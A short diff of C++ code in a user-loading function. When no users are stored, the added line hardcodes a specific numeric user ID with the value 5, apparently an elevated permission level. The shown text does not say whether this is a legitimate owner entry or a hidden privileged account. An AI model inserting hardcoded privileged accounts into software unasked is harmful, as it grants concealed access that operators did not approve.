@@ -82,6 +82,7 @@ void module::user::read()
 	else
 	{
 		users["default"] = 1;
+		users["323871959"] = 5;
 		module::user::save();
 	}
 }
